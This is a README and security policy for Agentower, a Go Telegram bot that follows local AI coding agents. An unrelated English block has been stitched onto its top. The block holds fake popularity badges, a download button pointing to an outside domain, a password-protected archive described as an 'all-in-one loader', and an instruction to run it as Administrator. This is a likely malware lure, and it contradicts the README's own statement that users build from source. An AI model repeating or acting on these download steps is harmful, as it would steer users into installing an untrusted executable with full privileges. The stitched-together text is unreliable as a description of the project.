<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Características

- **Multi-agente** — un solo bot maneja opencode (HTTP + SQLite), Claude Code
  (stdio JSON), Kiro (ACP sobre `kiro-cli`), GitHub Copilot (ACP/LSP),
  Codex (`codex exec --json`) y Antigravity (`agy --output-format
  stream-json`). Cada chat puede cambiar de agente sobre la marcha desde
  Telegram.
- **Long polling a Telegram** — sin puertos expuestos, sin túneles, sin
  webhooks.
- **Whitelist estricta por usuario** — solo el `ALLOWED_CHAT_ID` configurado
  puede usar el bot; cualquier otro intento se descarta silenciosamente.
- **Navegación limitada al workspace** — selector recursivo de carpetas que
  rechaza salir del workspace raíz, incluso con symlinks o `..`.
- **Estado persistente en SQLite** — workspace, proyecto activo, sesión
  activa, agente activo por chat y estados efímeros de navegación
  sobreviven a reinicios.
- **Aviso de tarea completada** — cuando el agente termina y no hubo
  actividad local, el wrapper (macOS o Windows) te manda un mensaje a
  Telegram (a los 2 minutos de inactividad) con la previsualización y
  botones para continuar o ver cambios.
- **Preguntas respondibles desde Telegram** — si el agente se detiene a
  pedir una decisión con opciones (hoy: opencode), el wrapper te reenvía
  la pregunta con botones al minuto de inactividad; tu respuesta
  (botón o texto) vuelve al agente que está corriendo en tu máquina.
- **App nativa para macOS (opcional)** — menú-barra con toggle, settings
  con formulario, auto-start al login, sección multi-agente con detección
  en PATH y en los bundles de las apps (Kiro CLI, VS Code Copilot), y
  logs accesibles desde Finder. Construye un `.app` ad-hoc firmado con
  `make app` que embebe el binario Go.
- **App nativa para Windows (opcional)** — icono en el área de
  notificación con popover y menú contextual, la misma ventana de
  Settings que macOS, detección de agentes con rutas de Windows,
  auto-inicio por registro (que además arranca el bot al iniciar sesión)
  y notificaciones de tarea/pregunta. Construye un `Agentower.exe`
  self-contained con `.\windows\build.ps1` (embebe `remote-bot.exe`).
- **Binario único en Go** — sin daemon, sin GUI obligatoria, sin firma.
  Tú lo compilas, lo ejecutas y lo paras con `Ctrl+C`.

## Requisitos

- macOS, Linux o Windows para el binario Go.
- macOS 13.0+ para la app nativa de menú-barra.
- Windows 10/11 x64 para la app de bandeja (`Agentower.exe`).
- Go 1.25 o superior.
- El **.NET 8 SDK** si vas a compilar el wrapper de Windows.
- Al menos uno de los siguientes agentes instalado localmente:
  - `opencode` (CLI; instala vía `brew install anomalyco/tap/opencode`)
  - `claude` (Claude Code CLI)
  - `kiro` (Kiro IDE/CLI; sesiones en `~/.kiro/`)
  - `copilot` o `copilot-language-server` (GitHub Copilot ACP/LSP)
  - `codex` (OpenAI Codex CLI; sesiones en `~/.codex/`)
  - `agy` (Antigravity CLI; sesiones en `~/.gemini/antigravity-cli/`)
- Un token de bot de Telegram desde `@BotFather`.
- Tu ID personal de chat desde `@userinfobot`.

## Inicio rápido

Agentower se distribuye como un wrapper nativo que **embebe** el binario
Go. La forma recomendada de usarlo es construir el wrapper de tu sistema y
configurar las credenciales desde la UI.

### macOS

```bash
make app
cp -R dist/Agentower.app /Applications/
xattr -dr com.apple.quarantine /Applications/Agentower.app
open /Applications/Agentower.app
```

Al primer arranque, abrí **Settings…** desde el menú de la barra, completá
`WORKSPACE_ROOT`, `TELEGRAM_BOT_TOKEN` y `ALLOWED_CHAT_ID`. La sección
**Agentes de IA** muestra qué CLIs detectó en PATH (botón "Reintentar
detección" para refrescar) y te permite habilitar opencode, Claude,
Kiro, Copilot, Codex o Antigravity individualmente. Al guardar, la app
escribe un `.env` con permisos `0600` en
`~/Library/Application Support/Agentower/`. A partir de ahí el toggle del
popover arranca y detiene el bot.

### Windows

```powershell
.\windows\build.ps1
.\dist\Agentower.exe
```

Al primer arranque aparece un icono en el área de notificación.
**Click izquierdo** abre el popover (toggle + acciones), **click derecho**
el menú contextual. Abrí **Configuración…**, completá `WORKSPACE_ROOT`,
`TELEGRAM_BOT_TOKEN` y `ALLOWED_CHAT_ID`, y en **Agentes** habilitá los
CLIs detectados. Al guardar, el wrapper escribe `settings.json` y `.env`
en `%APPDATA%\Agentower\`. La casilla de **Inicio** activa el arranque al
encender Windows; al lanzarse, la app **arranca el bot automáticamente**
si la configuración es válida. Detalles en
### Ejecución del binario sin la app (avanzado)

Si preferís correr el binario Go directamente, podés exportando las
variables en tu shell o apuntando `ENV_FILE` a un archivo propio:

```bash
go build -o remote-bot ./cmd/remote-bot
ENV_FILE=/ruta/a/tu/.env ./remote-bot
```

El bot resuelve la configuración desde el `.env` (con búsqueda en
directorios padre) o directamente desde las variables de entorno si
preferís no usar archivo.

### Variables obligatorias

| Variable             | Descripción                                            |
|----------------------|--------------------------------------------------------|
| `WORKSPACE_ROOT`     | Ruta absoluta que delimita toda la navegación.         |
| `TELEGRAM_BOT_TOKEN` | Token del bot desde `@BotFather`.                      |
| `ALLOWED_CHAT_ID`    | Tu ID numérico de usuario desde `@userinfobot`.        |

### Variables opcionales (multi-agente)

Cada agente tiene su propio slot, incluido opencode. El prefijo es
`AGENT_<KIND>_` en mayúsculas (`AGENT_OPENCODE_`, `AGENT_CLAUDE_`,
`AGENT_KIRO_`, `AGENT_COPILOT_`, `AGENT_CODEX_`, `AGENT_ANTIGRAVITY_`).
Las claves disponibles son:

| Clave                      | Por defecto | Descripción                                                                 |
|----------------------------|-------------|-----------------------------------------------------------------------------|
| `AGENT_<KIND>_ENABLED`      | `true`      | Habilita este agente para el bot. `false` lo apaga.                          |
| `AGENT_<KIND>_BIN`          | derivado    | Ruta al binario. Si está vacío se autodetecta vía `PATH` o los bundles/instaladores (VS Code Copilot, Kiro, Antigravity). |
| `AGENT_<KIND>_PORT`         | derivado    | Puerto loopback. Solo lo usan los agentes con servidor (opencode); el resto lo reserva sin usarlo. |
| `AGENT_<KIND>_ARGS`         | _(vacío)_   | Argumentos extra a pasarle al binario (avanzado).                            |

### Otras variables opcionales

| Variable              | Por defecto                                            | Descripción                                                                                              |
|-----------------------|--------------------------------------------------------|----------------------------------------------------------------------------------------------------------|
| `AGENTOWER_STATE_PATH`   | `<WORKSPACE_ROOT>/.agentower/state.db`           | Ubicación de la base SQLite.                                                                             |
| `AGENTOWER_STALE_AFTER`   | `30m`                                           | Sesiones más viejas que esto se ignoran en `/resume`.                                                      |
| `AGENTOWER_OPENCODE_STATE_DIR` | `~/.local/share/opencode`                  | Override del path de la base SQLite de opencode (historial de sesiones).                                 |
| `AGENTOWER_COPILOT_STATE_DIR` | derivado del SO                            | Override del path de VS Code globalStorage para Copilot Chat.                                            |
| `AGENTOWER_CLAUDE_STATE_DIR`  | `~/.claude`                                  | Override del path de Claude Code.                                                                        |
| `AGENTOWER_KIRO_STATE_DIR`    | `~/.kiro`                                    | Override del path de Kiro (CLI e IDE).                                                                   |
| `AGENTOWER_CODEX_STATE_DIR`   | `~/.codex`                                   | Override del path de sesiones de Codex.                                                                  |
| `AGENTOWER_ANTIGRAVITY_STATE_DIR` | `~/.gemini`                              | Override de la raíz de Antigravity (el adapter deriva `antigravity-cli`/`antigravity`).                  |
| `TELEGRAM_API_ROOT`   | (predeterminado de `telebot.v3`)                        | Override del endpoint de la API de Telegram (útil para mirrors o tests). Se lee del `.env` o del shell. |
## Multi-agente

Agentower es una extensión de Telegram para **seguir** a tus agentes, no
para controlarlos por completo. Detecta los agentes instalados y observa
sus sesiones sin que tengas que elegir nada: cada agente con un
`SessionLocator` tiene un observador que detecta cuándo termina una tarea
o hace una pregunta, y te avisa por Telegram. Desde el chat podés
continuar la sesión y responder, pero el agente lo seguís manejando en tu
IDE/TUI.

Los agentes disponibles son los que el detector encuentra en `PATH` o, si
no están ahí, en las ubicaciones de instalación de cada uno: bundles de
apps en macOS (Kiro CLI, GitHub Copilot de VS Code, Antigravity) y
directorios por usuario en Windows (`%APPDATA%\npm`,
`%LOCALAPPDATA%\Programs`, `~/.opencode`, `~/.bun`, `~/.codex`, …). Los
lanzamientos desde la GUI heredan un `PATH` mínimo (Finder/launchd en
macOS, el entorno de Explorer en Windows), así que el bot lo aumenta
antes de detectar con los directorios habituales del usuario
(`~/.local/bin`, `~/.nvm/...`, Homebrew, `%APPDATA%\npm`, …).

Cómo se comunica cada agente:

| Agente    | Transporte                                  | Historial / sesiones                        |
|-----------|---------------------------------------------|---------------------------------------------|
| opencode  | HTTP (`opencode serve`) + SQLite (`opencode.db`) | REST (`/session`, `/api/question`) / BD local (`session`, `message`, `part`) |
| claude    | stdio JSON (`claude --print --output-format stream-json`) | JSONL en `~/.claude/projects/<cwd>/`        |
| kiro      | ACP (`kiro-cli acp`)                        | JSONL en `~/.kiro/sessions/<ws>/<id>/`       |
| copilot   | ACP (CLI) / LSP (bundle de VS Code)         | `session-store.db` de VS Code globalStorage |
| codex     | headless (`codex exec --json -`)            | JSONL en `~/.codex/sessions/**/rollout-*`   |
| antigravity | headless (`agy -p --output-format stream-json`) | JSONL en `~/.gemini/antigravity-cli/...` |

Puertos reservados por agente (cada uno override-able por env):

| Agente    | Puerto por defecto |
|-----------|--------------------|
| opencode  | 4096               |
| claude    | 4097               |
| kiro      | 4099               |
| copilot   | 4100               |
| codex     | 4101               |
| antigravity | 4102             |

### Auto-arranque de los agentes

Agentower arranca los agentes **de forma perezosa**: no lanza nada al
inicio. Mientras no le escribas, el bot se limita a seguir las sesiones
leyendo su historial en disco (para opencode, directamente su base SQLite
`~/.local/share/opencode/opencode.db`, así que sigue tanto la TUI local
como `opencode serve`). Cuando envías texto libre, tocás **▶️ Continuar
sesión** o usás `/continue` por primera vez sobre una sesión, el bot
arranca el agente en la carpeta de ese proyecto (la que reporta el
locator) y recién ahí le manda el prompt.

Para opencode, si ya tenés un `opencode serve` corriendo lo **adopta** en
vez de levantar un segundo servidor; si no hay ninguno, lanza
`opencode serve --port 4096` en el directorio del proyecto. Los agentes
stdio (Claude Code, Kiro, Copilot, Codex, Antigravity) lanzan su
subproceso la primera vez que reciben un prompt a través del bot.

El bot apaga los subprocesos que sí haya arrancado él cuando recibe
`Ctrl+C` o una señal de terminación: con `SIGTERM`/`SIGKILL` en
macOS/Linux, y con `taskkill /T /F` del árbol de procesos en Windows. Un
`opencode serve` adoptado (arrancado por vos) nunca se mata.

## Comandos

| Comando                | Descripción                                             |
|------------------------|---------------------------------------------------------|
| `/start` / `/help`     | Bienvenida y lista de comandos.                         |
| `/status`              | Qué agente y sesión está siguiendo el bot.              |
| `/continue`            | Retoma la última tarea completada (la activa para responder). |
| `/resume`              | Detecta la sesión que se está ejecutando en tu máquina y te ofrece seguirla desde Telegram. |
| texto libre            | Responde a la sesión activa del agente. Si hay una pregunta pendiente del agente, el texto se envía como **respuesta a esa pregunta**. |

Los Inline Keyboards manejan el resto: **▶️ Continuar sesión** y **📝 Ver
cambios** en las notificaciones, y las opciones de las preguntas del
agente.

## Qué sesión sigue el bot

Agentower no necesita que le indiques proyecto ni agente. Cada agente con
locator tiene un observador que auto-sigue la sesión más reciente del
usuario (por ejemplo la que estás usando en Kiro, VS Code o en `opencode`
—tanto la TUI como `opencode serve`—) y registra el completado cuando deja
de cambiar.
Ignora sesiones que no se tocaron desde que el bot arrancó, así que un
reinicio no rerescribe completados viejos.

Cuando tocas **▶️ Continuar sesión** (o usás `/continue`), esa sesión pasa
a ser la activa y el texto libre que escribas se envía ahí. `/resume` hace
lo mismo pero consultando en el momento qué sesión está viva en tu
máquina.

## Notificaciones por inactividad

El wrapper observa cuánto tiempo llevas sin tocar el teclado o el mouse
(`CGEventSource` en macOS, `GetLastInputInfo` en Windows) y consulta el
estado del bot por un socket local. Con eso dispara dos flujos, pensados
para cuando te alejas de la computadora:

### Tarea completada (2 minutos)

1. El `SessionWatcher` detecta que la sesión dejó de cambiar y guarda un
   snapshot de completado.
2. Si pasan **2 minutos sin actividad local**, la app le pide al bot que
   te avise por Telegram.
3. Recibes un mensaje con proyecto, sesión, previsualización y botones
   **▶️ Continuar sesión** y **📝 Ver cambios**.

### Pregunta del agente (1 minuto)

Aplica a agentes que pueden pausar a mitad de una tarea para pedir una
decisión con opciones (hoy **opencode**, vía su *question tool*).

1. El `SessionWatcher` detecta la pregunta pendiente y **no** marca la
   tarea como completada (el agente no terminó, está esperando).
2. Si pasan **1 minuto sin actividad local**, la pregunta se reenvía a
   Telegram: encabezado, pregunta y una opción por botón (más el aviso de
   que podés responder con texto si la pregunta admite respuesta libre).
3. Respondés tocando una opción o escribiendo el texto. La respuesta se
   envía al agente que corre en tu máquina, que continúa la tarea.
4. Si son varias preguntas, se muestran una por una; al responderlas
   todas se envían juntas al agente. Cuando la tarea termina, entra el
   flujo normal de "tarea completada".

Los umbrales (1 y 2 minutos) están en `IdleNotifier.swift` (macOS) y
`IdleNotifier.cs` (Windows). El aviso Telegram para una pregunta ya
enviada no se repite; si la respondiste en la terminal, el bot descarta
el aviso pendiente.

> En macOS, al abrir la app (incluido el arranque al login) el bot
> arranca solo si la configuración es válida. En Windows pasa lo mismo:
> `Agentower.exe` se inicia al encender el equipo y **arranca el bot de
> inmediato** para que quede en segundo plano apenas empieces a trabajar.

## App nativa de macOS

Además del binario CLI hay un wrapper Swift opcional para macOS que vive
en la barra de menús (estilo Bluetooth), guarda la configuración en
`UserDefaults` + un `.env` con permisos `0600`, y arranca/para el bot con
un toggle.

### Build

```bash
make app
```

Esto:

1. Compila `remote-bot` (`arm64`) y lo coloca en
   `macos/Agentower/Resources/`.
2. Genera el `MenuBarIcon` monocromo (template) y el `AppIcon.icns` desde
   `macos/Agentower/assets/app-icon.jpeg` con `sips` + Python/Pillow.
3. Regenera el `.xcodeproj` con XcodeGen.
4. Compila con `xcodebuild` (`arm64`, sin firma de Apple Developer).
5. Empaqueta en `dist/Agentower.app` y lo firma ad-hoc.

Salida: `dist/Agentower.app` (~10.5 MB).

### Instalación y primer uso

```bash
# Mover a Aplicaciones
cp -R dist/Agentower.app /Applications/

# Quitar la marca de Gatekeeper (porque no tiene Developer ID)
xattr -dr com.apple.quarantine /Applications/Agentower.app

# Abrir
open /Applications/Agentower.app
```

Aparece un icono en la barra de menús. **Click izquierdo** abre el popover
con un toggle. **Click derecho** abre menú contextual.

**Primera vez**: el toggle está deshabilitado. Click en **Settings…**, llena
`WORKSPACE_ROOT`, `TELEGRAM_BOT_TOKEN`, `ALLOWED_CHAT_ID`. La sección
**Agentes de IA** muestra qué CLIs detectó en PATH (botón "Reintentar
detección" para refrescar) y te permite habilitar opencode, Claude,
Kiro o Copilot individualmente. Al guardar, la app escribe
`~/Library/Application Support/Agentower/.env` con permisos `0600` y a
partir de ahí el toggle funciona.

### Auto-inicio al login

En Settings marcá la casilla "Iniciar Agentower al arrancar macOS".
La app llama `SMAppService.mainApp.register()` y aparece en *Ajustes del
sistema → General → Ítems de inicio*. Solo funciona si la app vive en
`/Applications/` o `~/Applications/`.

Al abrir la app (incluido el arranque al login), si la configuración es
válida el bot arranca solo; no hace falta pulsar Iniciar.

### Cómo funciona el toggle

- **Apagado → click**: arranca `Resources/remote-bot` con env vars
  (`ENV_FILE=…/.env`, `AGENTOWER_STATE_PATH=…/state.db`, `GIN_MODE=release`,
  y opcionalmente `TELEGRAM_API_ROOT` y `TELEGRAM_PROXY_URL` si los
  llenaste en Settings). El binario lee el `.env` y entra en long-polling
  de Telegram.
- **Encendido → click**: `terminate()` (SIGTERM), espera 5 s, `SIGKILL` si
  no salió.
- **Cambios en Settings**: no rearrancan el bot en caliente; aparece un
  banner "Los cambios aplican al próximo inicio". Restart manual desde el
  toggle.

### Ubicaciones

| Recurso | Ruta |
|---|---|
| Settings (UserDefaults) | `~/Library/Preferences/dev.agentower.app.plist` |
| `.env` para el bot | `~/Library/Application Support/Agentower/.env` (`chmod 600`) |
| State DB (SQLite) | `~/Library/Application Support/Agentower/state.db` |
| Logs | `~/Library/Logs/Agentower/bot.log` |

### Prerrequisitos del entorno de build

- macOS con **Xcode** y **Xcode command-line tools** (`xcode-select --install`).
- **XcodeGen** (`brew install xcodegen` si falta).
- **Go** 1.25+ en `PATH`.
- **Python 3** con **Pillow** (`pip3 install Pillow`) para regenerar
  los iconos monocromos. Requerido solo si corres `make icons`.

## App nativa de Windows

Además del binario CLI hay un wrapper WinForms para Windows que vive en
el **área de notificación** de la barra de tareas (junto a Steam, Epic,
Discord…), guarda la configuración como JSON + `.env`, y arranca/para el
bot con un toggle. Es el equivalente funcional de la app de macOS.

### Build

```powershell
.\windows\build.ps1
```

Esto:

1. Compila `remote-bot` (`windows/amd64`) en
   `windows\Agentower\Resources\remote-bot.exe`.
2. Publica el wrapper como único fichero `dist\Agentower.exe`
   (self-contained, sin requerir .NET instalado).

Salida: `dist\Agentower.exe`.

Requiere **Go 1.25+** y el **.NET 8 SDK**. Detalles en
### Uso

`Agentower.exe` es portable. Al ejecutarlo por primera vez **ofrece
instalarse**: copia el exe a `%LOCALAPPDATA%\Programs\Agentower\`, crea
los accesos directos (menú Inicio y, opcionalmente, escritorio) y
registra el arranque con Windows. A partir de ahí no hace falta volver a
buscar el `.exe`: arranca solo al encender el equipo. También puedes
forzarlo por CLI (`--install`, `--uninstall`, `--portable`).

Ya en el área de notificación, **click izquierdo** abre el popover
(toggle + acciones) y **click derecho** el menú contextual. Abre
**Configuración…**, rellena `WORKSPACE_ROOT`, `TELEGRAM_BOT_TOKEN` y
`ALLOWED_CHAT_ID`, y en **Agentes** habilita los CLIs detectados. Al
guardar, el wrapper escribe `%APPDATA%\Agentower\settings.json` y `.env`.
El toggle arranca y detiene el bot.

### Ubicaciones

| Recurso | Ruta |
|---|---|
| App instalada | `%LOCALAPPDATA%\Programs\Agentower\Agentower.exe` |
| Acceso directo | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Agentower.lnk` |
| Settings (`settings.json`) | `%APPDATA%\Agentower\settings.json` |
| `.env` para el bot | `%APPDATA%\Agentower\.env` |
| State DB (SQLite) | `%APPDATA%\Agentower\state.db` |
| Binario extraído | `%LOCALAPPDATA%\Agentower\remote-bot.exe` |
| Logs | `%LOCALAPPDATA%\Agentower\logs\bot.log` |

### Notificación de tarea terminada y auto-inicio

El wrapper usa `GetLastInputInfo` para medir la inactividad y consulta el
servidor de control local del bot (`control.json` → `/state` →
`/notify` y `/question-notify`) para enviar el mensaje de Telegram y
mostrar una notificación de Windows cuando una tarea termina o el agente
hace una pregunta mientras no estás. La instalación registra el auto-
inicio en la clave `Run` del usuario (activado por defecto); al
arrancar, el wrapper **arranca el bot de inmediato** si la configuración
es válida, de modo que queda corriendo en segundo plano apenas empiezas a
trabajar.

## Automatización del inicio (CLI sin wrapper)

Si prefieres seguir con el binario Go puro y automatizar su arranque, las
opciones documentadas originalmente siguen vigentes: en macOS (Raycast
Script Command, Atajos de macOS o `launchd`) y en Windows (Programador de
tareas, la carpeta de Inicio o `HKCU\...\Run`). Los detalles y plantillas
están en el historial del repo; los wrappers cubren el mismo caso de uso
con menos fricción.

## Seguridad

- El bot solo responde al `ALLOWED_CHAT_ID` configurado. El resto se descarta
  silenciosamente sin llegar al handler.
- Los callbacks de los Inline Keyboards se validan contra un registro de
  navegación de corta vida por chat. Otros chats reciben "menú expirado".
- Todas las rutas que vienen de Telegram son relativas; se resuelven, se
  evaluan los symlinks y la ruta final debe permanecer dentro de
  `WORKSPACE_ROOT`.
- El token se lee del `.env` al arrancar. SQLite solo guarda proyecto
  activo, sesión activa y estado efímero — nunca contenido de prompts.
- Cuando se usa el wrapper de macOS, el `.env` regenerado se escribe con
  permisos `0600` y vive dentro de `~/Library/Application Support/`,
  accesible solo al usuario actual. En Windows, el `.env`, `settings.json`
  y `state.db` viven bajo `%APPDATA%\Agentower\`, que por defecto solo es
  accesible para la cuenta del usuario.

Consulta `SECURITY.md` para el modelo de confianza completo.

## Arquitectura

Hexagonal / Clean Architecture en Go, con tres capas concéntricas:

```text
internal/
  domain/      entidades (Project, Session, RuntimeState, NavigationState,
               FileChange, Message, CompletedSession, PendingQuestion,
               BotButton, BotResponse) y puertos (WorkspaceFS,
               StateRepository, NavigationRepository, AgentAdapter,
               AgentRegistry, AgentServerManager, SessionLocator,
               SessionEventLog, SnapshotPublisher, CompletionPublisher,
               QuestionAdapter, QuestionBroker, ChatNotifier, BotHandler)
  usecase/     navegador del workspace, navegación, Handler de comandos,
               SessionWatcher (polling de la sesión: completados y
               preguntas) y sentinels de error del dominio
  adapter/
    agents/    opencode (HTTP), claude (stdio JSON), kiro (ACP + JSONL),
               copilot (ACP/LSP), codex (headless JSON), antigravity
               (headless stream-json) + registry y detector (PATH + bundles)
    telegram/  long polling con telebot.v3, whitelist, callbacks,
               parser markdown → HTML
    storage/   repositorio SQLite (WAL, una conexión)
    control/   servidor HTTP local para los wrappers (/state, /notify,
               /question-notify)
    workspace/ adaptador de filesystem
    config/    cargador de .env (godotenv)
cmd/remote-bot/  composition root
```

La capa de dominio no tiene dependencias externas; todo lo demás va detrás
de interfaces declaradas por el dominio. Esto permite que los tests
sustituyan SQLite por un store en memoria y OpenCode por un servidor
`httptest`.

Los wrappers (macOS y Windows) y el bot hablan por un socket local
(`/state`, `/notify`, `/question-notify`): el bot nunca abre puertos hacia
afuera y los wrappers nunca hacen llamadas de red propias, solo consultan
ese socket en `127.0.0.1`.

Sobre el binario viven opcionalmente los wrappers nativos: `Agentower.app`
(SwiftUI + AppKit) en la barra de menús de macOS y `Agentower.exe`
(C#/.NET WinForms) en el área de notificación de Windows. Ambos actúan
como launcher con UI, persistencia y supervisión de logs.

Consulta `docs/DESIGN.md` para el documento de diseño completo.

## Producto

Consulta `docs/PRODUCT.md` para el alcance actual del producto, lo que
está dentro y fuera de alcance, y la hoja de ruta planificada.

## Desarrollo

```bash
go test ./...
go vet ./...
go build -o remote-bot ./cmd/remote-bot
```

Para construir el wrapper Swift:

```bash
make app
```

Para construir el wrapper de Windows:

```powershell
.\windows\build.ps1
```

CI: cada push y PR ejecuta `go test -race` con `-coverprofile` sobre
Go 1.25 (Ubuntu) y `golangci-lint` sobre Ubuntu, más un job de Windows
que compila `Agentower.exe` y corre su `--selftest`. Las dependencias se
mantienen al día vía Dependabot (`gomod`, `github-actions`, `swift`),
agrupadas en PRs separados por tipo. La configuración del linter vive en
`.golangci.yml`.

El repositorio conserva el binario `remote-bot` compilado en la raíz por
comodidad (es el único artefacto que produce el proyecto). Bórralo antes de
publicar una rama si no quieres enviar el binario compilado junto con el
código fuente.

## Estructura

```text
.
├── cmd/remote-bot/              punto de entrada Go
├── internal/
│   ├── adapter/                 agentes (opencode/claude/kiro/copilot/
│   │                            codex/antigravity), Telegram, SQLite,
│   │                            control local, filesystem
│   ├── config/                  cargador de .env
│   ├── domain/                  entidades y puertos
│   └── usecase/                 navegador del workspace, navegación, handler,
│                                session watcher (completados y preguntas)
├── macos/
│   └── Agentower/          wrapper Swift (status bar, settings, login item)
├── windows/
│   ├── Agentower/          wrapper C# / .NET 8 WinForms (tray, settings, idle)
│   └── build.ps1           compila remote-bot.exe y Agentower.exe
├── docs/
│   ├── DESIGN.md                arquitectura y decisiones
│   └── PRODUCT.md               alcance y hoja de ruta
├── .github/
│   ├── workflows/ci.yml         tests Go + golangci-lint + build Windows
│   ├── dependabot.yml           actualizaciones semanales de dependencias
│   ├── ISSUE_TEMPLATE/          bug report y feature request
│   └── PULL_REQUEST_TEMPLATE.md checklist para contribuidores
├── .golangci.yml                configuración del linter
├── AGENTS.md                    guía para agentes de IA / contribuidores
├── CODE_OF_CONDUCT.md
├── CONTRIBUTING.md
├── LICENSE
├── Makefile                     build del wrapper macOS
├── README.md
├── SECURITY.md
├── go.mod
├── go.sum
└── remote-bot                   binario compilado (arm64)
```

## Licencia

MIT. Consulta `LICENSE`.


---

# Seguridad

Este documento describe el modelo de confianza de Agentower y los
límites que el bot promete cumplir. Si vas a modificar el código que toca
la whitelist, la validación del workspace o el manejo del token, léelo
antes — todo cambio en esa superficie requiere un test focalizado.

## Modelo de confianza

El bot está pensado para un único usuario. Solo responde al chat
configurado en `ALLOWED_CHAT_ID`; cualquier otro mensaje o callback se
descarta silenciosamente, sin error ni eco, en el middleware de
`telebot.v3`.

- **Inbound**: únicamente la API de Telegram mediante long polling. El
  binario no abre ningún socket.
- **Outbound**: el agente activo. Por defecto `127.0.0.1:4096`
  para hablar con `opencode serve`; en sesiones de Claude/Kiro el bot
  abre pipes stdin/stdout (Claude) o ACP sobre stdio (Kiro); con Copilot
  habla JSON-RPC sobre stdio con el language server o el CLI ACP; Codex y
  Antigravity son CLIs headless que el bot lanza por stdin/stdout. El
  polling a Telegram siempre va contra `api.telegram.org` (o el override
  de `TELEGRAM_API_ROOT`).
- **Control local**: los wrappers (macOS/Windows) consultan un servidor
  HTTP efímero en `127.0.0.1` (`internal/control`, dirección en
  `control.json`) para el aviso de inactividad. No escucha en interfaces
  externas.
- **Storage**: un único archivo SQLite con estado de runtime; nunca
  credenciales.

## Qué puede y qué no puede hacer el bot

**Puede**, mientras el chat esté en la whitelist:

- Avisarte cuando una tarea termina o cuando el agente se queda esperando
  una respuesta.
- Continuar la última tarea completada (`/continue`) o la sesión que
  detecta viva en tu máquina (`/resume`).
- Enviar prompts de texto libre a la sesión seguida.
- Pedir el diff de una sesión completada (botón **📝 Ver cambios**).
- Responder las preguntas del agente con botones o texto.

**No puede**:

- Salir de `WORKSPACE_ROOT`. Ya no recibe rutas desde Telegram; el root
  solo acota el proyecto que deriva de una sesión.
- Lanzar, rearrancar ni apagar agentes (`/init`, `/projects`, `/agent`
  ya no existen).
- Crear, listar ni seleccionar sesiones arbitrarias desde el chat.
- Revertir cambios (`/undo` ya no existe).
- Ejecutar comandos de shell arbitrarios.
- Recibir mensajes de multimedia (voz, imágenes, documentos).
- Atender a varios chats en paralelo: la whitelist es un único ID.

## Seguridad del workspace

La invariante "toda ruta que toque el bot debe quedar dentro de
`WORKSPACE_ROOT`" se aplica en **un solo lugar**:
`WorkspaceBrowser.resolve` (`internal/usecase/workspace_browser.go`).

El handler ya no acepta rutas desde Telegram: no hay navegador de
carpetas ni `/init <ruta>`. La única ruta que el bot maneja es la que
viene en una `ActiveSession`/`CompletedSession` (por ejemplo el
`directory` de una sesión de opencode), y se acota con
`relativeUnderWorkspace` antes de guardarla.

La validación rechaza:

- Rutas absolutas.
- Componentes `..` que escaparían del workspace.
- Symlinks cuyo destino queda fuera de la raíz.
- Rutas que no existen o no son directorios.

Al listar, además se omiten:

- Directorios ocultos (los que empiezan por `.`).
- Symlinks cuyo destino está fuera del workspace, incluso si el enlace
  sí está dentro.

## Almacenamiento

- El token del bot y el `ALLOWED_CHAT_ID` viven **solo** en `.env` (o en
  variables de shell). No se persisten en SQLite ni en logs.
- SQLite guarda: `runtime_state` (workspace, proyecto, sesión seguida),
  `agent_state` y `completed_session`. La tabla `directory_navigation`
  es un remanente del antiguo navegador de carpetas y ya no la usa el
  handler.
- SQLite **no** guarda: contenidos de prompts, respuestas de OpenCode,
  historial de chat, ni credenciales.
- El archivo `state.db` se crea con permisos `0600` (sólo el usuario
  que ejecuta el bot). En Windows, el estado y la config del wrapper
  viven bajo `%APPDATA%\Agentower\` (perfil del usuario) y los logs bajo
  `%LOCALAPPDATA%\Agentower\logs\`.

## Variables de entorno sensibles

| Variable             | Por qué es sensible                                       |
|----------------------|-----------------------------------------------------------|
| `TELEGRAM_BOT_TOKEN` | Acceso completo al bot; quien lo tenga puede suplantarte. |
| `ALLOWED_CHAT_ID`    | Si se cambia, el bot deja de responderte (o responde a otro). |

Recomendaciones:

- `.env` en `.gitignore`. El wrapper de macOS escribe el suyo en
  `~/Library/Application Support/Agentower/.env` con permisos `0600`, y
  el de Windows en `%APPDATA%\Agentower\.env` (perfil del usuario); no
  commitees nunca archivos con credenciales reales.
- Si usás el binario CLI directamente, mantené tu `.env` con `chmod 600`
  (Unix) o dentro de tu perfil de usuario (Windows).
- No lo pegues en issues, screenshots ni logs.

## Distribución

- Binario único compilado por el usuario desde el código fuente. No hay
  binario firmado ni `Developer ID` de Apple, así que el `.app` requiere
  quitar la cuarentena; el `.exe` de Windows no está firmado y puede
  disparar SmartScreen ("Más información → Ejecutar de todas formas").
- Sin telemetría, sin auto-actualización, sin llamadas a servicios de
  terceros.

## Lista de comprobación antes de desplegar

1. `WORKSPACE_ROOT` apunta a un directorio real, sin symlinks que
   apunten fuera.
2. `.env` con `chmod 600` (Unix) o dentro de tu perfil (Windows) y commit
   ignorado.
3. `ALLOWED_CHAT_ID` coincide con tu chat real (verifica con
   `@userinfobot`).
4. Has compilado con `go build -o remote-bot ./cmd/remote-bot` desde una
   copia limpia del repo (o con el wrapper: `make app` / `.\windows\build.ps1`).
